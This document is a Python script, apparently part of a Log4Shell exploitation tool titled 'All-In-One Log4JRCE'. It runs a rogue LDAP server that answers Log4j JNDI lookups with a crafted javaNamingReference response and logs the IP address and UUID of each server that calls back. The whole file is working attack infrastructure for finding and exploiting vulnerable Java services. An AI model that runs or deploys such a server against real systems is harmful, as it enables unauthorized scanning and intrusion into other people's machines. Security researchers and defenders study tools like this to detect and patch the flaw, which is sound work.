import argparse
import socketserver
import threading
import time

uuid_list = []


class Serializer():
    """
    Stack-based Serialization utility.
    """

    __payload: bytes
    __size_stack: bytes

    def __init__(self):
        self.__payload = b""
        self.__size_stack = []

    def push(self, data: bytes) -> "Serializer":
        self.__last = data
        self.__payload = data + self.__payload
        return self

    def pop_size(self) -> "Serializer":
        return self.push(bytes([len(self.__payload) - self.__size_stack.pop()]))

    def push_size(self, count=1) -> "Serializer":
        for _ in range(count):
            self.__size_stack.append(len(self.__payload))

        return self

    def build(self) -> bytes:
        return self.__payload

    def __repr__(self) -> str:
        return f"Serializer{self.__payload}"


class LDAPResponse():
    """
    Builder for LDAP query response.
    """

    __query_name: str
    __attributes: dict

    def __init__(self, query_name: str, attributes: dict):
        self.__query_name = query_name
        self.__attributes = attributes

    def serialize(self) -> bytes:
        s = Serializer()
        s.push_size(2)
        for k, v in reversed(self.__attributes.items()):
            s.push_size(3).push(v.encode()).pop_size().push(b"\x04").pop_size().push(b"1")
            s.push_size().push(k.encode()).pop_size().push(b"\x04").pop_size().push(b"0")

        s.push(b"0\x81\x82")
        s.push_size().push(self.__query_name.encode()).pop_size().push(b"\x04").pop_size()
        s.push(b"\x02\x01\x02d\x81").pop_size().push(b"0\x81")

        SUCCESS_RESPONSE = b"0\x0c\x02\x01\x02e\x07\n\x01\x00\x04\x00\x04\x00"
        return s.build() + SUCCESS_RESPONSE


class LDAPHandler(socketserver.BaseRequestHandler):
    """
    Malicious query handler.
    """

    def __init__(self, ):
        pass

    def __call__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def handle(self):
        handshake = self.request.recv(8096)
        self.request.sendall(b"0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00")
        time.sleep(0.5)
        query = self.request.recv(8096)
        if len(query) < 10:
            return
        query_name = query[9:9 + query[8:][0]].decode()
        if query_name not in uuid_list:
            uuid_list.append(query_name)
        else:
            self.request.close()
            return
        print(f"IP: {self.request.getpeername()[0]}  UUID: {query_name}")

        response = LDAPResponse(query_name, {
            "objectClass": "javaNamingReference",
            "javaFactory": "hello"
        })
        self.request.sendall(response.serialize())

        time.sleep(0.5)
        query = self.request.recv(8096)
        self.request.close()


class LDAPServer(threading.Thread):
    '''LDAPServer'''

    def __init__(self, host="0.0.0.0", port=-1, ):
        '''Create a new SOCKS4 proxy on the specified port'''

        self._host = host
        self._port = port
        self.server = None
        threading.Thread.__init__(self)

    def run(self):
        with socketserver.TCPServer((self._host, self._port), LDAPHandler()) as self.server:
            self.server.serve_forever()

    def stop(self):
        self.server.shutdown()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="All-In-One Log4JRCE by alexandre-lavoie")
    parser.add_argument("--ldap_port", "-p", help="The local port to run the LDAP server.", type=int, default=1387)
    args = parser.parse_args()
    socketserver.TCPServer.allow_reuse_address = True
    print(f"Run LDAP Server on port : {args.ldap_port}")
    with socketserver.TCPServer(("0.0.0.0", args.ldap_port), LDAPHandler()) as server:
        server.serve_forever()
